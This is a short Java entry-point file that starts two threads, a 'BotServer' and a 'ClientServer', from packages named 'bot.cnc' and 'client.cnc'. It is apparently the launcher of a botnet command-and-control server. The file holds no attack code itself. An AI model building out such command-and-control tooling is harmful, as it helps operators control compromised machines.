package xyz.terrific.server;

import xyz.terrific.server.bot.cnc.BotServer;
import xyz.terrific.server.client.cnc.ClientServer;

import java.io.IOException;

public class ServerMain {

    public static void main(String[] args) {

        new Thread(() -> {
            try {
                BotServer.init();
            } catch (IOException e) {
                System.out.println("[ ERROR | Server | Bot ]  " + e.getMessage());
            }
        }).start();

        new Thread(() -> {
            try {
                ClientServer.init();
            } catch (IOException e) {
                System.out.println("[ ERROR | Server | Client ]  " + e.getMessage());
            }
        }).start();

    }

}
